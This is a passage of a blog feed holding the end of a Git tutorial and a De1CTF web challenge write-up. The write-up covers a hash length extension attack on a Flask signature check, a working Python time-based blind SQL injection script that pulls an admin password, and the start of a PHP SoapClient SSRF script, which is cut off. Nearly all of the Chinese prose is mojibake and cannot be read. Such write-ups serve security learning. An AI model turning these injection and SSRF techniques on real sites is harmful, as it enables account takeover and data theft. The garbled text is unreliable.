whz_tianxiadiyi.txt"</span></span></span><br></pre></td></tr></table></figure><p>å¦‚æœæ˜¯è¯¯åˆ çš„è¯ï¼Œä¸€æ¡å‘½ä»¤å³å¯æ¢å¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git checkout -- whz_tianxiadiyi.txt</span></span><br></pre></td></tr></table></figure><h3 id="åˆ†æ”¯"><a href="#åˆ†æ”¯" class="headerlink" title="åˆ†æ”¯"></a>åˆ†æ”¯</h3><p>åˆ›å»ºåˆ†æ”¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch dev</span></span><br></pre></td></tr></table></figure><p>åˆ‡æ¢åˆ†æ”¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git checkout dev  //æ³¨æ„ä¸æ¢å¤åˆ é™¤åŒºåˆ†</span></span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹å½“å‰åˆ†æ”¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch</span></span><br></pre></td></tr></table></figure><p><strong><em>ç„¶ååœ¨åˆ†æ”¯ä¸‹è¿›è¡Œä¸€ç³»åˆ—æ“ä½œï¼ˆæ·»åŠ æ–‡ä»¶ä¹‹ç±»ï¼‰</em></strong></p><p>åˆå¹¶åˆ†æ”¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git checkout master</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git merge dev</span></span><br></pre></td></tr></table></figure><p>åˆ é™¤åˆ†æ”¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch -d dev</span></span><br></pre></td></tr></table></figure><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>è¯´æ¥æƒ­æ„§ï¼Œæ³¨å†ŒGitHubè´¦å·å¿«ä¸€å¹´äº†ï¼Œé™¤ééœ€è¦ä¸‹è½½ä¸€äº›å·¥å…·å‡ ä¹ä¸æ€ä¹ˆçœ‹githubï¼›ä¸€æ˜¯è®¿é—®é€Ÿåº¦æ…¢+å…¨è‹±æ„Ÿè§‰ä¸æ˜¯å¾ˆå‹å¥½ï¼ŒäºŒæ˜¯å°±ä¸ªäººæ¥è¯´å¯¹å¤§å¤šæ•°äººæ¨èçš„ä¸œè¥¿ä¸æ˜¯å¾ˆæƒ³äº†è§£ï¼ˆgithubï¼Œdockerï¼Œbootstrap ç­‰ç­‰â€¦ï¼‰</p><p>ä¸è¿‡æœ€è¿‘æœ‰åœ¨æ…¢æ…¢æ”¹å˜ï¼Œæ„Ÿè§‰ä¹‹å‰å¤ªæµ®èºäº†ï¼Œä¸ºäº†è¿›çº¿ä¸‹/æ‹¿å¥–è€ŒCTFï¼Œæ²¡è¿›å°±å¼€å§‹è‡ªé—­ã€‚çº¿ä¸‹éœ€è¦è¿›ï¼Œä½†ä¹Ÿåˆ«å¿˜äº†æ‰“CTFçš„ä¹è¶£å§~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;Gitæ˜¯ä¸€ä¸ªä¼˜ç§€çš„åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œä½¿ç”¨èµ·æ¥ç¡®å®æ¯”è¾ƒæ–¹ä¾¿ã€‚&lt;/p&gt;
&lt;p&gt;è¶ç€å‘¨æœ«èŠ±äº†ä¸¤ä¸ªå°æ—¶å­¦ä¹ äº†ä¸€ä¸‹åŸºç¡€å‘½ä»¤ï¼Œä»¥ç›®å‰æˆ‘çš„ç†è§£æ¥è¯´ï¼Œå®ƒä¸»
      
    
    </summary>
    
    
    
      <category term="Basic" scheme="https://www.sketchplane.top/tags/Basic/"/>
    
  </entry>
  
  <entry>
    <title>De1ctf Webå¤ç°</title>
    <link href="https://www.sketchplane.top/2019/09/25/De1ctf-Web%E5%A4%8D%E7%8E%B0/"/>
    <id>https://www.sketchplane.top/2019/09/25/De1ctf-Web%E5%A4%8D%E7%8E%B0/</id>
    <published>2019-09-25T15:26:12.000Z</published>
    <updated>2019-09-26T05:48:59.824Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘æ·±æ„Ÿè‡ªå·±è¯­è¨€åŸºç¡€å·®ï¼Œå¾—æ¶è¡¥ä¸€ä¸‹äº†= =</p><h2 id="SSRFMe"><a href="#SSRFMe" class="headerlink" title="SSRFMe"></a>SSRFMe</h2><p><strong>è€ƒå¯Ÿç‚¹ï¼šHashé•¿åº¦æ‹“å±•æ”»å‡»</strong></p><p>è¿™é¢˜æˆ‘äº†è§£åˆ°æœ‰ä¸‰ç§è§£æ³•ï¼Œå…¶ä¸­ä¸€ä¸ªå­—ç¬¦ä¸²æ‹¼æ¥è¿˜æŒºæœ‰æ„æ€çš„ï¼Œä¸è¿‡å¬è¯´å¸ˆå‚…æŠ•å…ˆçŸ¥æ²¡æœ‰è¢«æ”¶ï¼Œä¼°è®¡åº”è¯¥åœ¨åšå®¢é‡Œï¼Œæœ‰å…´è¶£å¯ä»¥å»å­¦ä¹ ä¸€æ³¢ã€‚</p><p>ç›´æ¥ç»™äº†ä»£ç ï¼Œæˆ‘ä»¬å®¡è®¡ä¸€ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)  <span class="comment"># ç”Ÿæˆä¸€ä¸ªé•¿åº¦ä¸º16çš„éšæœºå­—ç¬¦ä¸²</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment"># SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>, <span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¼ å…¥ipï¼Œmd5åè¿”å›æ²™ç›’æ–‡ä»¶å</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># paramç¦ç”¨gopherå’Œfileåè®®</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check = param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure><p>å…ˆçœ‹<code>Exec()</code>å‡½æ•°:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">def Exec(<span class="keyword">self</span>):</span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">self</span>.checkSign()):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"scan"</span> in <span class="keyword">self</span>.action:</span><br><span class="line">            tmpfile = open(<span class="string">"./%s/result.txt"</span> % <span class="keyword">self</span>.sandbox, <span class="string">'w'</span>)</span><br><span class="line">            resp = scan(<span class="keyword">self</span>.param)  <span class="comment"># è¿è¡Œä¸€ä¸ªscanå‡½æ•°ï¼Œå‚æ•°å¯æ§</span></span><br><span class="line">            <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                result[<span class="string">'data'</span>] = resp</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> resp</span><br><span class="line">                tmpfile.write(resp)</span><br><span class="line">                tmpfile.close()</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> in <span class="keyword">self</span>.action:</span><br><span class="line">            f = open(<span class="string">"./%s/result.txt"</span> % <span class="keyword">self</span>.sandbox, <span class="string">'r'</span>)</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">        <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">            result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>ä¸»è¦åŠŸèƒ½æœ‰<code>scan</code>å’Œ<code>read</code>ï¼›<code>scan</code>ä¼šæ‰§è¡Œä¸€ä¸ªscan()å‡½æ•°(paramå¯æ§)ã€å¹¶å°†ç»“æœæ‰“å°å¹¶å­˜å…¥result.txtï¼Œ<code>read</code>å°†result.txtçš„å†…å®¹è¯»å‡ºæ¥ã€‚</p><p>äºæ˜¯æˆ‘ä»¬è·Ÿè¿›scan()å‡½æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br></pre></td></tr></table></figure><p>å‘ç°å¯ä»¥è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œä½†æ˜¯wafå¤„æœ‰fileå’Œgopherçš„é»‘åå•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check = param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>æ ¹æ®hintå°è¯•è®¿é—®./flag.txtï¼Œå‘ç°è¿”å›ç­¾å</p><p><img src="https://t1.picb.cc/uploads/2019/08/09/ghPwad.png" alt="img"></p><p>çœ‹ä¸€ä¸‹éªŒè¯ç­¾åçš„å‡½æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure><p>å¾ˆå®¹æ˜“æƒ³åˆ°hashæ‹“å±•readè¯»å–flag</p><p><strong>æ€è·¯ï¼šå…ˆè®¿é—®flag.txtè·å–åˆå§‹signï¼Œç„¶åhashæ‹“å±•å®ç°scanå‚¨å­˜å’Œreadè¯»å–å³å¯è·å–flagã€‚</strong></p><p>hashé•¿åº¦æ‹“å±•æˆ‘è¿™é‡Œç”¨çš„æ˜¯HashPumpï¼ŒåŸç†å¯ä»¥å‚è€ƒæˆ‘çš„å¦ä¸€ç¯‡æ–‡ç« ï¼š<a href="https://www.sketchplane.top/2019/06/05/Hashé•¿åº¦æ‹“å±•æ”»å‡»/#more">Hashé•¿åº¦æ‹“å±•æ”»å‡»</a></p><p><img src="https://t1.picb.cc/uploads/2019/08/09/ghPfEa.png" alt="img"></p><p><strong>æ³¨æ„ï¼šè®°å¾—æŠŠâ€™\xâ€™æ¢æˆâ€™%â€™ï¼Œå¦å¤–keyçš„é•¿åº¦æ˜¯24ä¸æ˜¯16(åŒ…å«â€™flag.txtâ€™)</strong></p><p><img src="https://t1.picb.cc/uploads/2019/08/09/ghPIeu.png" alt="img"></p><p><strong>æ³¨æ„ï¼šExec()å‡½æ•°å’ŒgeneSign()å‡½æ•°åœ¨ä¸åŒè·¯ç”±ä¸‹ï¼Œåˆ†åˆ«æ˜¯â€™/De1taâ€™å’Œâ€™â€™/geneSignâ€™</strong></p><p><strong>flagåˆ°æ‰‹~</strong></p><h2 id="Shellshellshell"><a href="#Shellshellshell" class="headerlink" title="Shellshellshell"></a>Shellshellshell</h2><p>è€ƒå¯Ÿç‚¹ï¼šåŸé¢˜æœç´¢(é€ƒ ã€SoapClientç±»ååºåˆ—åŒ–ã€‚</p><p>é¦–å…ˆæ‰«ç›®å½•æŠŠæºç downä¸‹æ¥ï¼Œç„¶åå¼€å§‹å®¡è®¡ï¼š</p><p>å‘ç°insert()å‡½æ•°æœ‰ç‚¹é—®é¢˜ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'signature'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'mood'</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    $mood = addslashes(serialize(<span class="keyword">new</span> Mood((int)$_POST[<span class="string">'mood'</span>],get_ip())));</span><br><span class="line">    $db = <span class="keyword">new</span> Db();</span><br><span class="line">    @$ret = $db-&gt;insert(<span class="keyword">array</span>(<span class="string">'userid'</span>,<span class="string">'username'</span>,<span class="string">'signature'</span>,<span class="string">'mood'</span>),<span class="string">'ctf_user_signature'</span>,<span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;userid,<span class="keyword">$this</span>-&gt;username,$_POST[<span class="string">'signature'</span>],$mood));</span><br><span class="line">    <span class="keyword">if</span>($ret)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://t1.picb.cc/uploads/2019/09/26/gRFviu.png" alt=""></p><p>å‘ç°å¯ä»¥å»¶æ—¶æ³¨å…¥ï¼Œäºæ˜¯è·‘ä¸€ä¸‹adminçš„å¯†ç ï¼Œå†™ä¸ªè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://a24cf81d-16b9-45cc-9ab1-23b73378fba1.node2.buuoj.cn.wetolink.com:82/index.php?action=publish"</span></span><br><span class="line">s = requests.session()</span><br><span class="line">cookies = &#123;<span class="string">'PHPSESSID'</span>: <span class="string">'4em1g9rscdc9mfvddp6nno8i17'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># çˆ†ç ´é•¿åº¦</span></span><br><span class="line">max_length = <span class="number">100</span></span><br><span class="line"><span class="comment"># å­—ç¬¦é›†åˆ</span></span><br><span class="line">character = <span class="string">"abcdef1234567890"</span></span><br><span class="line"><span class="comment"># æ•°æ®åº“å</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment"># éå†æ¯ä¸€ä¸ªå­—ç¬¦</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, max_length):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> character:</span><br><span class="line">        signature = <span class="string">"123`,(if((ascii(substr((select password from ctf_users limit 1),%d,1)))=%d,sleep(5),1)))#"</span> % (i, ord(c))</span><br><span class="line">        mood = <span class="number">0</span></span><br><span class="line">        data = &#123;<span class="string">'signature'</span>: signature, <span class="string">'mood'</span>: mood&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">            s.post(url, data=data, cookies=cookies, timeout=<span class="number">4.5</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            flag += c</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>è·‘ä¸€ä¸‹è„šæœ¬ï¼Œå³å¯å¾—åˆ°adminçš„å¯†ç ï¼Œå°è¯•ç™»å½•ï¼Œå‘ç°ç™»å½•å¤±è´¥ï¼Œå› ä¸ºadminè®¾ç½®äº†éæœ¬åœ°ipä¸å…è®¸ç™»å½•ï¼Œæˆ‘ä»¬éœ€è¦ç»•è¿‡<code>$_SERVER [â€˜REMOTE_ADDRâ€™]</code>ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°SSRFï¼Œå†åŠ ä¸Šå­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œè¿™é‡Œå¯ä»¥è€ƒè™‘åˆ©ç”¨SoapClientåŸç”Ÿç±»çš„ååºåˆ—åŒ–æ¥å®ç°SSRFã€‚</p><p>è´´ä¸ªè„šæœ¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">'http://xxx.xxx.xxx.xxx/index.php?action=login'</span>;</span><br><span class="line">$post_string = <span class="string">'username=admiin&amp;password=jaivypassword&amp;code=(è‡ªå·±çš„éªŒè¯ç )'</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'Cookie: PHPSESSID=1234'</span> <span class="comment">#(æœªç™»å½•çš„cookieï¼Œä¾¿äºä»¥adminèº«ä»½è¿›è¡Œç™»é™†)</span></span><br><span class="line">    );</span><br><span class="line">$b = <span 